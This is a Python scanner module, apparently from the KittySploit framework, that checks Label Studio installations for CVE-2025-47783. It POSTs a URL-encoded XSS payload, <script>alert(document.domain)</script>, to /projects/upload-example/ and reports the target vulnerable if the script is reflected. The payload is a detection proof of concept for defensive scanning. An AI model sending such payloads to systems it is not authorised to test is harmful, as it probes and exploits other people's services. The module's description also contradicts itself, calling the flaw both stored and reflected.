#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Label Studio < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Label Studio < 1.18.0 - Reflected XSS Detection',
        'description': 'Label Studio < 1.18.0 contains a stored XSS caused by improper sanitization in POST /projects/upload-example/ endpoint, letting attackers inject malicious scripts to hijack sessions and perform unauthorized actions, exploit requires sending crafted requests.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'label-studio', 'xss', 'reflected'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h'],
        'cve': 'CVE-2025-47783',
    }

    def run(self):
        path = '/version'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/projects/upload-example/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='label_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22%24textjmwwi%26lt%3bscript%26gt%3balert(document.domain)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Label Studio < 1.18.0 - Reflected XSS detected', path=path)
            return True
        return False

